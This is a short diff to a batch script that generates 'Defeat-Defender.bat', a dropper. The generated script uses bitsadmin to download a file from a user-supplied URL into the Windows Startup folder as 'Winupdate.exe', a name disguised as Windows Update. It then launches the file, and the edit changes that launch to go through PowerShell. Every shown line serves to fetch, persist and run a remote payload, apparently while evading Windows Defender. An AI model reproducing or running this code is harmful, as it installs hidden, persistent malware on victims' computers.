@@ -20,7 +20,7 @@ echo Your  Url is :  %a%
 echo. >>Defeat-Defender.bat
 echo bitsadmin /transfer Packages /download /priority foreground %a% "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
-echo start  Winupdate.exe >>Defeat-Defender.bat
+echo powershell -command "start Winupdate.exe" >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
 echo.
